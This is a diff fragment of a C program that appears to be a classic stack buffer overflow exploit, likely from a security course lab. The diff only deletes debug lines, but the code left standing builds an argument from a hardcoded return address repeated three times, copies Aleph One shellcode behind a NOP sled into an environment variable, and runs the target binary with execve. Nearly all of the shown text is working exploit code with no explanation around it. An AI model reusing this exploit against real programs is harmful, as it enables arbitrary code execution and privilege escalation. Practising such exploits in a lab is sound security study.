@@ -14,10 +14,7 @@ int main(void)
   
   args[0] = TARGET;
 
-//change the address to the env
-  printf("AA\n");
   char rt_arr[12] = "";
-//bf ff fe c8
   for (int i=0; i <3 ; i++){
         strcat(rt_arr, "\xd4\xfe\xff\xbf");
   }
@@ -31,13 +28,9 @@ int main(void)
 
   memcpy(a+sizeOfNoOp, shellcodeAlephOne, sizeOfShell*sizeof(char));
 
-
   args[1] = rt_arr; 
   args[2] = NULL;
- 
-
-
- 
+  
   env[0] = a;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
